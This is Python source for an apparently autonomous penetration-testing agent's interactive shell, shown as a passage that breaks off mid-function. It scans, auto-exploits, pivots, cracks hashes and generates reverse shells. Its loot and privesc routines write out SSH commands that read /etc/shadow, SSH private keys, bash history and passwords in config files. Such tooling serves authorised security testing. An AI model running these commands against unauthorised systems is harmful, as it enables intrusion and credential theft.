"""PEN-AI REPL - Interactive terminal like Claude Code.

Enhanced with:
- Auto-scan when target is provided
- Real-time dashboard
- Progress indicators
- Smarter exploitation
- HTML report generation
- Network visualization
- Credential management
- Safety checks
- Session replay
- Better UX
"""

import asyncio
import os
import sys
import json
import re
from datetime import datetime
from typing import Optional

from ai.autonomous_executor import AutonomousExecutor
from ai.brain import AttackSurface, DecisionEngine
from ai.streaming import StreamPrinter
from ai.context_compressor import ContextCompressor
from ai.credential_cracker import CredentialCracker
from ai.shell_generator import ShellGenerator
from ai.credential_manager import CredentialManager
from ai.auto_chains import FullAutoChain, ReconChain, ExploitChain, PostExploitChain
from core.session import SessionManager
from core.safety import SafetyChecker
from core.session_replay import SessionReplay
from reporting.html_report import HTMLReportGenerator
from recon.network_viz import NetworkVisualizer


class PenAIRepl:
    """Interactive CLI like Claude Code. Type commands, AI executes."""

    BANNER = """
\033[91m███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
\033[91m████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
\033[91m██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
\033[91m██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
\033[91m██║ ╚████║███████╗██╔╝ ╚██╗╚██████╔╝███████║
\033[91m╚═╝  ╚═══╝╚══════╝╚═╝   ╚═╝ ╚═════╝ ╚══════╝
\033[0m  Autonomous Penetration Testing Agent v2.1
  Type 'help' for commands. Ctrl+C to exit.
"""

    def __init__(self, llm=None):
        self.executor = AutonomousExecutor(timeout=300)
        self.printer = StreamPrinter(delay=0.003)
        self.compressor = ContextCompressor()
        self.cracker = CredentialCracker()
        self.shells = ShellGenerator()
        self.session_mgr = SessionManager()
        self.decision_engine = DecisionEngine()
        self.cred_manager = CredentialManager()
        self.session_replay = SessionReplay()
        self.llm = llm

        # State
        self.target = ""
        self.hosts = []
        self.services = {}
        self.credentials = []
        self.access_map = {}
        self.pivoted = []
        self.failed = set()
        self.commands_run = []
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.running = True
        self.auto_mode = False
        self.start_time = datetime.now()

    async def run(self):
        """Main REPL loop."""
        print(self.BANNER)

        # Auto-scan if target was set before run()
        if self.target:
            print(f"  \033[96mTarget detected: {self.target}\033[0m")
            print(f"  \033[90mStarting auto-scan...\033[0m\n")
            await self._cmd_scan(self.target)

        while self.running:
            try:
                prompt = self._get_prompt()
                user_input = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: input(prompt)
                )
                user_input = user_input.strip()

                if not user_input:
                    continue

                if user_input.lower() in ["quit", "exit", "q"]:
                    await self._cmd_exit()
                    break
                elif user_input.lower() == "help":
                    self._cmd_help()
                elif user_input.lower() in ["state", "dashboard"]:
                    self._cmd_dashboard()
                elif user_input.lower().startswith("scan "):
                    await self._cmd_scan(user_input[5:].strip())
                elif user_input.lower() == "scan":
                    if self.target:
                        await self._cmd_scan(self.target)
                    else:
                        print("  Usage: scan <target>  or  set target <ip>")
                elif user_input.lower() == "exploit":
                    await self._cmd_exploit()
                elif user_input.lower() == "enum":
                    await self._cmd_enum()
                elif user_input.lower() == "pivot":
                    await self._cmd_pivot()
                elif user_input.lower() == "crack":
                    await self._cmd_crack()
                elif user_input.lower() == "report":
                    self._cmd_report()
                elif user_input.lower() == "auto":
                    await self._cmd_auto_chain()
                elif user_input.lower() == "auto-recon":
                    await self._cmd_auto_recon()
                elif user_input.lower() == "auto-exploit":
                    await self._cmd_auto_exploit()
                elif user_input.lower() == "auto-post":
                    await self._cmd_auto_post()
                elif user_input.lower() == "loot":
                    await self._cmd_loot()
                elif user_input.lower() == "privesc":
                    await self._cmd_privesc()
                elif user_input.lower() == "map":
                    self._cmd_network_map()
                elif user_input.lower() == "creds":
                    self._cmd_creds()
                elif user_input.lower() == "replay":
                    self._cmd_replay_list()
                elif user_input.lower().startswith("replay "):
                    self._cmd_replay(user_input[7:].strip())
                elif user_input.lower().startswith("set target "):
                    target = user_input[11:].strip()
                    valid, msg = SafetyChecker.validate_target(target)
                    if not valid:
                        print(f"  \033[91m✗ {msg}\033[0m")
                        continue
                    self.target = target
                    print(f"  \033[92m✓ Target set: {self.target}\033[0m")
                    print(f"  \033[90mAuto-scanning target...\033[0m")
                    await self._cmd_scan(self.target)
                elif user_input.lower().startswith("sessions"):
                    self._cmd_sessions()
                elif user_input.lower().startswith("resume "):
                    self._cmd_resume(user_input[7:].strip())
                elif user_input.lower().startswith("shell "):
                    self._cmd_shell(user_input[6:].strip())
                elif user_input.lower().startswith("attack "):
                    await self._cmd_attack(user_input[7:].strip())
                elif user_input.lower() == "suggest":
                    self._cmd_suggest()
                elif user_input.lower().startswith("run "):
                    await self._cmd_run(user_input[4:].strip())
                elif user_input.lower() == "install":
                    await self._cmd_install_menu()
                elif user_input.lower().startswith("install "):
                    await self._cmd_install(user_input[8:].strip())
                else:
                    await self._cmd_run(user_input)

            except KeyboardInterrupt:
                print("\n\n  Ctrl+C. Type 'exit' to quit or 'report' to see results.")
            except EOFError:
                break
            except Exception as e:
                print(f"  \033[91m✗ Error: {e}\033[0m")

    def _get_prompt(self) -> str:
        if self.target:
            access_info = ""
            if self.access_map:
                levels = set(self.access_map.values())
                access_info = f" [\033[92m{'|'.join(levels)}\033[0m]"
            host_count = len(self.hosts)
            svc_count = sum(len(v) for v in self.services.values())
            cred_count = len(self.credentials)
            return f"\033[91mpen-ai\033[0m:{self.target} [{host_count}h {svc_count}s {cred_count}c]{access_info} > "
        return "\033[91mpen-ai\033[0m > "

    def _cmd_help(self):
        print("""
\033[1m  COMMANDS:\033[0m

  \033[96mRECON:\033[0m
    scan <target>          - Scan target (hosts + services)
    enum                   - Enumerate all discovered services
    map                    - Show network visualization

  \033[91mEXPLOIT:\033[0m
    exploit                - Auto-exploit all found services
    attack <host>:<port>   - Attack specific host:port
    crack                  - Crack found hashes

  \033[93mPOST-EXPLOIT:\033[0m
    privesc                - Attempt privilege escalation
    loot                   - Harvest credentials and sensitive data
    pivot                  - Find and pivot to new networks
    shell <type>           - Generate reverse shell (bash/python/php)

  \033[92mINFO:\033[0m
    dashboard              - Show engagement dashboard
    state                  - Show current engagement state (alias)
    suggest                - Get attack suggestions
    report                 - Generate HTML + JSON report
    creds                  - Show all discovered credentials

  \033[95mSESSION:\033[0m
    sessions               - List saved sessions
    resume <session_id>    - Resume previous session
    replay                 - List replayable sessions
    replay <session_id>    - Show session details
    set target <ip>        - Set target (auto-scans)

  \033[93mTOOLS:\033[0m
    install <tool>         - Install a tool
    run <command>          - Run any command

  \033[91mAUTO CHAINS:\033[0m
    auto                   - Full auto: scan → enum → exploit → privesc → pivot → loot
    auto-recon             - Auto recon chain
    auto-exploit           - Auto exploit chain
    auto-post              - Auto post-exploit chain

  \033[90mOTHER:\033[0m
    help                   - Show this help
    exit / quit / q        - Exit (saves session)
""")

    def _cmd_dashboard(self):
        elapsed = datetime.now() - self.start_time
        minutes = int(elapsed.total_seconds() / 60)
        seconds = int(elapsed.total_seconds() % 60)

        total_svcs = sum(len(v) for v in self.services.values())

        print(f"""
\033[1m{'='*60}
{' '*20}ENGAGEMENT DASHBOARD
{'='*60}\033[0m

  \033[1mTARGET:\033[0m      {self.target or 'Not set'}
  \033[1mSESSION:\033[0m     {self.session_id}
  \033[1mDURATION:\033[0m    {minutes}m {seconds}s
  \033[1mCOMMANDS:\033[0m    {len(self.commands_run)}

  \033[1m{'─'*56}\033[0m
  \033[92mHOSTS:\033[0m       {len(self.hosts)} discovered
  \033[96mSERVICES:\033[0m    {total_svcs} open
  \033[91mCREDENTIALS:\033[0m {len(self.credentials)} found
  \033[95mACCESS:\033[0m      {self.access_map or 'None'}
  \033[95mPIVOTS:\033[0m      {len(self.pivoted)} networks
  \033[1m{'─'*56}\033[0m
""")

        if self.hosts:
            print("  \033[1mHOSTS:\033[0m")
            for h in self.hosts:
                svcs = self.services.get(h, [])
                svc_str = ", ".join(f"{s.get('port', '?')}/{s.get('service', '?')}" for s in svcs)
                access = self.access_map.get(h, "")
                access_str = f" [\033[92m{access}\033[0m]" if access else ""
                print(f"    {h}{access_str}: {svc_str or 'no services found'}")

        if self.credentials:
            print("\n  \033[1mCREDENTIALS:\033[0m")
            for c in self.credentials:
                val = str(c.get("value", ""))[:60]
                print(f"    [{c.get('type', '?')}] {val}")

        print(f"{'='*60}")

    def _cmd_network_map(self):
        print(NetworkVisualizer.visualize(self.hosts, self.services, self.access_map, self.pivoted))
        print(NetworkVisualizer.visualize_services_table(self.services))

    def _cmd_creds(self):
        """Show all credentials."""
        # Sync with credential manager
        for c in self.credentials:
            self.cred_manager.add(
                username=c.get("username", ""),
                password=c.get("password", c.get("value", "")),
                credential_type=c.get("type", "password"),
                target=self.target,
            )
        print(self.cred_manager.summary())

    def _cmd_replay_list(self):
        """List replayable sessions."""
        sessions = self.session_replay.list_sessions()
        if not sessions:
            print("  No saved sessions.")
            return

        print("\n  \033[1m📋 REPLAYABLE SESSIONS:\033[0m")
        print(f"  {'─'*60}")
        print(f"  {'ID':<20} {'Target':<15} {'Hosts':<8} {'Creds':<8}")
        print(f"  {'─'*60}")
        for s in sessions:
            print(f"  {s['session_id']:<20} {s['target']:<15} {s['hosts']:<8} {s['credentials']:<8}")
        print(f"  {'─'*60}")
        print(f"  Usage: replay <session_id>")

    def _cmd_replay(self, session_id: str):
        """Show session details."""
        print(self.session_replay.get_session_summary(session_id))

    async def _cmd_scan(self, target: str):
        self.target = target
        print(f"\n  \033[96m🔍 Scanning {target}...\033[0m\n")

        print("  \033[90m[1/3]\033[0m Host discovery...")
        result = await self.executor.run(f"nmap -sn -T4 {target}", timeout=120)
        if result.exit_code == 0:
            hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result.stdout)
            self.hosts = list(set(hosts))
            print(f"  \033[92m✓ Found {len(self.hosts)} hosts\033[0m")
            for h in self.hosts:
                print(f"    → {h}")
        else:
            print(f"  \033[91m✗ Scan failed: {result.stderr[:100]}\033[0m")
            return

        if not self.hosts:
            print("  No live hosts found.")
            return

        print(f"\n  \033[90m[2/3]\033[0m Service enumeration on {len(self.hosts)} hosts...")
        for i, host in enumerate(self.hosts[:10], 1):
            print(f"    \033[90m[{i}/{min(len(self.hosts), 10)}]\033[0m Scanning {host}...")
            result = await self.executor.run(f"nmap -sV --top-ports 1000 -T4 {host}", timeout=120)
            if result.exit_code == 0:
                services = []
                for match in re.finditer(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", result.stdout):
                    port = int(match.group(1))
                    svc = match.group(3)
                    ver = match.group(4).strip() if match.group(4) else ""
                    services.append({"port": port, "service": svc, "version": ver})
                    print(f"      \033[92m✓\033[0m {port}/{match.group(2)} open {svc} {ver}")
                self.services[host] = services

        total_svcs = sum(len(v) for v in self.services.values())
        print(f"\n  \033[90m[3/3]\033[0m Analysis complete")
        print(f"  \033[1m📊 SCAN COMPLETE\033[0m")
        print(f"  Hosts: {len(self.hosts)} | Services: {total_svcs}")

        self._show_attack_plan()
        print(NetworkVisualizer.visualize_compact(self.hosts, self.services, self.access_map))
        self.session_mgr.auto_save(self._get_state(), self.session_id)

    def _show_attack_plan(self):
        all_svcs = []
        for host, svcs in self.services.items():
            for svc in svcs:
                svc_copy = svc.copy()
                svc_copy["_host"] = host
                all_svcs.append(svc_copy)
        if not all_svcs:
            return

        plan = AttackSurface.get_attack_plan(all_svcs, host=self.hosts[0] if self.hosts else "?")
        if not plan:
            return

        print(f"\n  \033[1m🎯 DISCOVERED SERVICES:\033[0m")
        for i, svc_info in enumerate(plan[:10], 1):
            host = svc_info.get('host', '?')
            port = svc_info.get('target_port', '?')
            name = svc_info.get('target_service', '?')
            ver = svc_info.get('target_version', '')
            print(f"    {i}. \033[96m{host}:{port} -> {name}\033[0m")
            if ver:
                print(f"       \033[90mversion: {ver}\033[0m")

        print(f"\n  Run 'exploit' to attempt exploitation, or 'attack <host>:<port>' for specific.")

    async def _cmd_exploit(self):
        if not self.services:
            print("  No services found. Run 'scan' first.")
            return

        print(f"\n  \033[91m⚔️  AUTO-EXPLOIT MODE\033[0m\n")

        total_attempts = 0
        total_success = 0

        for host, svcs in self.services.items():
            for svc in svcs:
                port = svc.get("port", 0)
                service = svc.get("service", "").lower()
                print(f"  \033[96m→ Attacking {host}:{port} ({service})\033[0m")

                try:
                    from exploitation.engine import ExploitationEngine
                    engine = ExploitationEngine()
                    attempts = await engine.auto_exploit_service(host, port, service)
                    total_attempts += len(attempts)
                    for attempt in attempts:
                        status = "\033[92m✓\033[0m" if attempt.status.value == "success" else "\033[91m✗\033[0m"
                        print(f"    {status} {attempt.technique}: {attempt.status.value}")
                        if attempt.status.value == "success":
                            total_success += 1
                            if attempt.access_gained:
                                self.access_map[host] = attempt.access_gained.value
                                print(f"      \033[91m🎯 ACCESS: {attempt.access_gained.value} on {host}\033[0m")
                            if attempt.evidence:
                                for line in attempt.evidence.split("\n")[:5]:
                                    print(f"      {line[:100]}")
                        elif attempt.error:
                            print(f"      {attempt.error[:100]}")
                except Exception as e:
                    print(f"    \033[91m✗ Engine error: {e}\033[0m")

        print(f"\n  \033[1mEXPLOITATION COMPLETE\033[0m")
        print(f"  Attempts: {total_attempts} | Success: {total_success}")
        self._cmd_suggest()

    async def _cmd_enum(self):
        if not self.services:
            print("  No services found. Run 'scan' first.")
            return

        print(f"\n  \033[96m🔍 ENUMERATING ALL SERVICES\033[0m\n")

        for host, svcs in self.services.items():
            for svc in svcs:
                service = svc.get("service", "").lower()
                port = svc.get("port", 0)
                print(f"  → Enumerating {service}:{port} on {host}...")

                try:
                    from exploitation.engine import ExploitationEngine
                    engine = ExploitationEngine()
                    modules = engine.orchestrator.get_modules_by_service(service)
                    if modules:
                        for module in modules:
                            result = await module.check_vulnerability(host, port)
                            if result.get("vulnerable"):
                                print(f"    \033[92m✓ {module.info.name}: {result.get('details', 'vulnerable')}\033[0m")
                            else:
                                print(f"    \033[90m  {module.info.name}: {result.get('reason', 'not vulnerable')}\033[0m")
                    else:
                        print(f"    \033[90m  No modules available for {service}\033[0m")
                except Exception as e:
                    print(f"    \033[91m  Error: {e}\033[0m")

    async def _cmd_pivot(self):
        if not self.access_map:
            print("  No access yet. Exploit first.")
            return

        print(f"\n  \033[95m🔀 PIVOT DISCOVERY\033[0m\n")

        for host, level in self.access_map.items():
            cred = self.credentials[0] if self.credentials else None
            if cred:
                password = cred.get("password", "")
                username = cred.get("username", "root")

                print(f"  → Checking routes on {host}...")
                result = await self.executor.run(
                    f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'ip route'",
                    timeout=30
                )
                if result.exit_code == 0:
                    print(f"    Routes: {result.stdout[:200]}")

                result = await self.executor.run(
                    f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'ip addr'",
                    timeout=30
                )
                if result.exit_code == 0:
                    print(f"    Interfaces: {result.stdout[:200]}")

                result = await self.executor.run(
                    f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'arp -a'",
                    timeout=30
                )
                if result.exit_code == 0:
                    new_hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result.stdout)
                    for h in new_hosts:
                        if h not in self.hosts and h != host:
                            self.hosts.append(h)
                            print(f"    \033[91m→ NEW HOST: {h}\033[0m")

    async def _cmd_privesc(self):
        if not self.access_map:
            print("  No access yet. Exploit first.")
            return

        print(f"\n  \033[91m⬆️  PRIVILEGE ESCALATION\033[0m\n")

        for host, level in self.access_map.items():
            if level in ["root", "system", "admin"]:
                print(f"  {host}: Already at {level} access")
                continue

            cred = self.credentials[0] if self.credentials else None
            if not cred:
                print(f"  {host}: No credentials available")
                continue

            password = cred.get("password", "")
            username = cred.get("username", "root")

            print(f"  → Attempting privesc on {host} ({level} -> ?)...")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'sudo -l 2>/dev/null'",
                timeout=15
            )
            if result.exit_code == 0 and "NOPASSWD" in result.stdout:
                print(f"    \033[92m✓ NOPASSWD sudo found!\033[0m")
                self.access_map[host] = "admin"
                print(f"    \033[91m🎯 ACCESS: admin on {host}\033[0m")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'find / -perm -u=s -type f 2>/dev/null | head -20'",
                timeout=30
            )
            if result.exit_code == 0 and result.stdout.strip():
                suid_bins = result.stdout.strip().split("\n")
                print(f"    Found {len(suid_bins)} SUID binaries")
                for b in suid_bins[:5]:
                    print(f"      {b}")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'uname -r'",
                timeout=10
            )
            if result.exit_code == 0:
                kernel = result.stdout.strip()
                print(f"    Kernel: {kernel}")

    async def _cmd_loot(self):
        if not self.access_map:
            print("  No access yet. Exploit first.")
            return

        print(f"\n  \033[93m💰 LOOTING\033[0m\n")

        for host, level in self.access_map.items():
            cred = self.credentials[0] if self.credentials else None
            if not cred:
                continue

            password = cred.get("password", "")
            username = cred.get("username", "root")

            print(f"  → Harvesting from {host}...")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat /etc/shadow 2>/dev/null | head -10'",
                timeout=15
            )
            if result.exit_code == 0 and "$" in result.stdout:
                print(f"    \033[92m✓ Shadow file readable\033[0m")
                hashes = re.findall(r"(\w+):\$(\d+)\$([^\s:]+)", result.stdout)
                for user, hash_type, hash_val in hashes:
                    print(f"      {user}: ${hash_type}${hash_val[:20]}...")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -5'",
                timeout=15
            )
            if result.exit_code == 0 and result.stdout.strip():
                print(f"    \033[92m✓ SSH keys found\033[0m")
                for key in result.stdout.strip().split("\n"):
                    print(f"      {key}")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat ~/.bash_history 2>/dev/null | tail -20'",
                timeout=15
            )
            if result.exit_code == 0 and result.stdout.strip():
                print(f"    \033[92m✓ Bash history\033[0m")
                for line in result.stdout.strip().split("\n")[:5]:
                    print(f"      {line[:80]}")

            result = await self.executor.run(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'grep -rn password /etc/ 2>/dev/null | head -10'",
                timeout=15
            )
            if result.exit_code == 0 and result.stdout.strip():
                print(f"    \033[92m✓ Passwords in configs\033[0m")
                for line in result.stdout.strip().split("\n")[:5]:
                    print(f"      {line[:80]}")

    async def _cmd_crack(self):
        if not self.credentials:
            print("  No credentials/hashes found yet.")
            return

        print(f"\n  \033[93m🔓 CRACKING CREDENTIALS\033[0m\n")

        results = await self.cracker.auto_crack(self.credentials)
        if results:
            for r in results:
                print(f"  \033[92m✓ CRACKED: {r.get('password', '?')}\033[0m")
                if r not in self.credentials:
                    self.credentials.append(r)
        else:
            print("  No additional credentials cracked.")

    def _cmd_report(self):
        elapsed = datetime.now() - self.start_time
        minutes = int(elapsed.total_seconds() / 60)

        print(f"""
\033[1m{'='*60}
{' '*15}PEN-AI ENGAGEMENT REPORT
{'='*60}\033[0m

  \033[1mSession:\033[0m   {self.session_id}
  \033[1mTarget:\033[0m    {self.target}
  \033[1mDuration:\033[0m  {minutes} minutes
  \033[1mCommands:\033[0m  {len(self.commands_run)}

  \033[1mHOSTS DISCOVERED:\033[0m {len(self.hosts)}
""")
        for h in self.hosts:
            svcs = self.services.get(h, [])
            access = self.access_map.get(h, "")
            print(f"    {h} {'['+access+']' if access else ''}")
            for s in svcs:
                print(f"      {s.get('port', '?')}/{s.get('service', '?')} {s.get('version', '')}")

        print(f"""
  \033[1mCREDENTIALS FOUND:\033[0m {len(self.credentials)}
""")
        for c in self.credentials:
            print(f"    [{c.get('type', '?')}] {str(c.get('value', ''))[:60]}")

        print(f"""
  \033[1mACCESS LEVELS:\033[0m
""")
        for h, level in self.access_map.items():
            print(f"    {h}: \033[91m{level}\033[0m")

        print(f"""
  \033[1mNETWORKS:\033[0m {len(self.pivoted)}
""")
        for n in self.pivoted:
            print(f"    {n}")

        print(f"{'='*60}")

        # Generate HTML report
        report = HTMLReportGenerator(title="PEN-AI Engagement Report")
        report.load_from_state(self._get_state())
        report.start_time = self.start_time
        report.end_time = datetime.now()

        for host, level in self.access_map.items():
            report.add_finding(
                title=f"Access gained on {host}",
                severity="critical",
                description=f"Successfully gained {level} access on {host}",
            )

        for cred in self.credentials:
            report.add_finding(
                title=f"Credential discovered: {cred.get('type', '?')}",
                severity="high",
                description=f"Found credential: {str(cred.get('value', ''))[:40]}",
            )

        for net in self.pivoted:
            report.add_finding(
                title=f"New network discovered: {net}",
                severity="medium",
                description=f"Discovered network segment {net} through pivoting",
            )

        import tempfile
        report_dir = os.path.join(tempfile.gettempdir(), f"penai_{self.session_id}")
        os.makedirs(report_dir, exist_ok=True)

        html_file = os.path.join(report_dir, "report.html")
        json_file = os.path.join(report_dir, "report.json")

        report.save_html(html_file)
        report.save_json(json_file)

        print(f"\n  \033[92m📄 Reports generated:\033[0m")
        print(f"    HTML: {html_file}")
        print(f"    JSON: {json_file}")

        basic_report = {
            "session_id": self.session_id,
            "target": self.target,
            "hosts": self.hosts,
            "services": self.services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "pivoted": self.pivoted,
            "commands_run": self.commands_run,
            "timestamp": datetime.now().isoformat(),
            "duration_minutes": minutes,
        }
        basic_file = os.path.join(report_dir, "engagement.json")
        with open(basic_file, "w") as f:
            json.dump(basic_report, f, indent=2, default=str)
        print(f"    Data: {basic_file}")

    async def _cmd_auto(self):
        self.auto_mode = True
        print(f"\n  \033[91m🤖 AUTONOMOUS MODE ACTIVATED\033[0m")
        print(f"  Agent will keep running until Ctrl+C\n")

        cycle = 0
        while self.auto_mode and self.running:
            cycle += 1
            print(f"\n  \033[90m─── CYCLE {cycle} ───\033[0m")

            state = {
                "target": self.target,
                "hosts": self.hosts,
                "services": self.services,
                "credentials": self.credentials,
                "access_map": self.access_map,
                "pivoted": self.pivoted,
                "failed": list(self.failed),
                "commands_run": self.commands_run,
            }

            commands = self.decision_engine.decide_next(state)

            if commands:
                for cmd in commands:
                    print(f"  $ {cmd[:100]}")
                    result = await self.executor.run(cmd, timeout=120)
                    self.commands_run.append(cmd)

                    if result.exit_code == 0:
                        self._parse_output(cmd, result.stdout, result.stderr)
                    else:
                        self.failed.add(cmd)

            self.session_mgr.auto_save(self._get_state(), self.session_id, interval_cycles=5)

    async def _cmd_auto_chain(self):
        """Run full auto chain: scan → enum → exploit → privesc → pivot → loot."""
        chain = FullAutoChain(self.executor)
        result = await chain.run(self.target)

        # Update REPL state from chain result
        self.hosts = result.get("hosts", [])
        self.services = result.get("services", {})
        self.access_map = result.get("access", {})
        self.credentials = result.get("credentials", [])
        self.pivoted = result.get("pivoted", [])

        # Add loot to credentials
        loot = result.get("loot", {})
        for shadow in loot.get("shadow", []):
            self.credentials.append({"type": "shadow_hash", "value": shadow.get("hash", ""), "username": shadow.get("user", "")})

        self._cmd_dashboard()
        self._cmd_report()

    async def _cmd_auto_recon(self):
        """Run auto recon chain."""
        chain = ReconChain(self.executor, self.state)
        result = await chain.run(self.target)
        self.hosts = result.get("hosts", [])
        self.services = result.get("services", {})
        print(NetworkVisualizer.visualize_compact(self.hosts, self.services, self.access_map))

    async def _cmd_auto_exploit(self):
        """Run auto exploit chain."""
        if not self.services:
            print("  No services found. Run 'scan' or 'auto-recon' first.")
            return
        chain = ExploitChain(self.executor, self.state)
        result = await chain.run(self.services)
        self.access_map.update(result.get("access", {}))
        self.credentials.extend(result.get("credentials", []))
        self._cmd_dashboard()

    async def _cmd_auto_post(self):
        """Run auto post-exploit chain."""
        if not self.access_map:
            print("  No access yet. Run 'exploit' first.")
            return
        chain = PostExploitChain(self.executor, self.state)
        result = await chain.run(self.access_map, self.credentials)
        self.pivoted.extend(result.get("new_networks", []))
        loot = result.get("loot", {})
        for shadow in loot.get("shadow", []):
            self.credentials.append({"type": "shadow_hash", "value": shadow.get("hash", ""), "username": shadow.get("user", "")})
        self._cmd_dashboard()

    @property
    def state(self):
        return {
            "hosts": self.hosts,
            "services": self.services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "pivoted": self.pivoted,
            "failed": list(self.failed),
            "commands_run": self.commands_run,
        }

    def _cmd_suggest(self):
        effective_hosts = self.hosts or list(self.services.keys())

        state = {
            "target": self.target,
            "hosts": effective_hosts,
            "services": self.services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "failed": list(self.failed),
            "commands_run": self.commands_run,
        }

        commands = self.decision_engine.decide_next(state)
        reasoning = AttackSurface.reason_about_findings(state)

        print(f"\n  \033[1mSUGGESTIONS:\033[0m")
        print(f"  {reasoning}")
        print()

        if self.services:
            self._show_attack_plan()
        else:
            for cmd in commands:
                print(f"    -> \033[96m{cmd[:80]}\033[0m")

    async def _cmd_attack(self, target: str):
        if ":" in target:
            host, port = target.split(":", 1)
            port = int(port)
        else:
            host = target
            port = 80

        service = "http"
        for h, svcs in self.services.items():
            for s in svcs:
                if s.get("port") == port:
                    service = s.get("service", "http")
                    break

        print(f"\n  \033[91m⚔️  ATTACKING {host}:{port} ({service})\033[0m\n")

        try:
            from exploitation.engine import ExploitationEngine
            engine = ExploitationEngine()
            attempts = await engine.auto_exploit_service(host, port, service)
            for attempt in attempts:
                status = "\033[92m✓\033[0m" if attempt.status.value == "success" else "\033[91m✗\033[0m"
                print(f"  {status} {attempt.technique}: {attempt.status.value}")
                if attempt.status.value == "success":
                    if attempt.access_gained:
                        self.access_map[host] = attempt.access_gained.value
                        print(f"    \033[91m🎯 ACCESS: {attempt.access_gained.value} on {host}\033[0m")
                    if attempt.evidence:
                        for line in attempt.evidence.split("\n")[:5]:
                            print(f"    {line[:100]}")
                elif attempt.error:
                    print(f"    {attempt.error[:100]}")
        except Exception as e:
            print(f"  \033[91m✗ Engine error: {e}\033[0m")

    async def _cmd_run(self, command: str):
        # Safety check
        is_safe, reason = SafetyChecker.is_safe(command)
        if not is_safe:
            print(f"  \033[91m✗ BLOCKED: {reason}\033[0m")
            return

        print(f"  $ {command}")
        result = await self.executor.run(command, timeout=300)
        self.commands_run.append(command)

        if result.stdout:
            for line in result.stdout.strip().split("\n")[:30]:
                print(f"  {line}")
        if result.stderr and result.exit_code != 0:
            print(f"  \033[91m{result.stderr[:200]}\033[0m")

        self._parse_output(command, result.stdout, result.stderr)

    async def _cmd_install(self, tool: str):
        print(f"  Installing {tool}...")
        result = await self.executor.install_tool(tool)
        if result.exit_code == 0:
            print(f"  \033[92m✓ {tool} installed\033[0m")
        else:
            print(f"  \033[91m✗ Failed to install {tool}\033[0m")

    async def _cmd_install_menu(self):
        tools = {
            "nmap": "Network scanner",
            "enum4linux": "SMB/AD enumeration",
            "gobuster": "Directory brute force",
            "ffuf": "Fast web fuzzer",
            "nikto": "Web vulnerability scanner",
            "hydra": "Login brute force",
            "sqlmap": "SQL injection",
            "john": "Password cracker",
            "hashcat": "GPU password cracker",
            "smbclient": "SMB client",
            "ldapsearch": "LDAP enumeration",
            "impacket": "AD attack tools",
            "binwalk": "Firmware analysis",
            "checksec": "Binary security check",
        }
        print("\n  \033[1mAVAILABLE TOOLS:\033[0m")
        for tool, desc in tools.items():
            print(f"    {tool:20s} - {desc}")
        print("\n  Usage: install <tool_name>")

    def _cmd_shell(self, shell_type: str):
        if not self.access_map:
            print("  No access yet. Need LHOST and LPORT.")
            print("  Usage: shell <type> <lhost> <lport>")
            return

        parts = shell_type.split()
        if len(parts) == 3:
            stype, lhost, lport = parts
            shell = self.shells.generate_reverse_shell(stype, lhost, int(lport))
            print(f"\n  \033[91mSHELL ({stype}):\033[0m")
            print(f"  {shell}")
        else:
            print("  Usage: shell <bash|python|php|powershell> <lhost> <lport>")

    def _cmd_sessions(self):
        sessions = self.session_mgr.list_sessions()
        if not sessions:
            print("  No saved sessions.")
            return
        print("\n  \033[1mSAVED SESSIONS:\033[0m")
        for s in sessions:
            print(f"    {s['session_id']} | {s['target']} | Cycle {s['cycle']} | {s['hosts']} hosts | {s['credentials']} creds")

    def _cmd_resume(self, session_id: str):
        state = self.session_mgr.load(session_id)
        if state:
            self.target = state.get("target", "")
            self.hosts = state.get("known_hosts", [])
            self.services = state.get("known_services", {})
            self.credentials = state.get("credentials", [])
            self.access_map = state.get("access_map", {})
            self.pivoted = state.get("pivoted_networks", [])
            self.commands_run = state.get("commands_run", [])
            self.session_id = session_id
            print(f"  \033[92m✓ Resumed session {session_id}\033[0m")
            self._cmd_dashboard()
        else:
            print(f"  \033[91m✗ Session {session_id} not found\033[0m")

    async def _cmd_exit(self):
        state = self._get_state()
        self.session_mgr.save(state, self.session_id)
        self.cred_manager.save()
        print(f"  Session saved: {self.session_id}")

    def _parse_output(self, command: str, stdout: str, stderr: str):
        output = stdout + stderr

        hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
        for h in hosts:
            if h not in self.hosts:
                self.hosts.append(h)

        services = re.findall(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", output)
        for port, proto, svc, ver in services:
            host = self.target
            for h in self.hosts:
                if h in command:
                    host = h
                    break
            if host not in self.services:
                self.services[host] = []
            svc_info = {"port": int(port), "service": svc, "version": ver.strip() if ver else ""}
            if svc_info not in self.services[host]:
                self.services[host].append(svc_info)

        # Extract credentials using manager
        new_creds = self.cred_manager.add_from_output(output, target=self.target)
        for cred in new_creds:
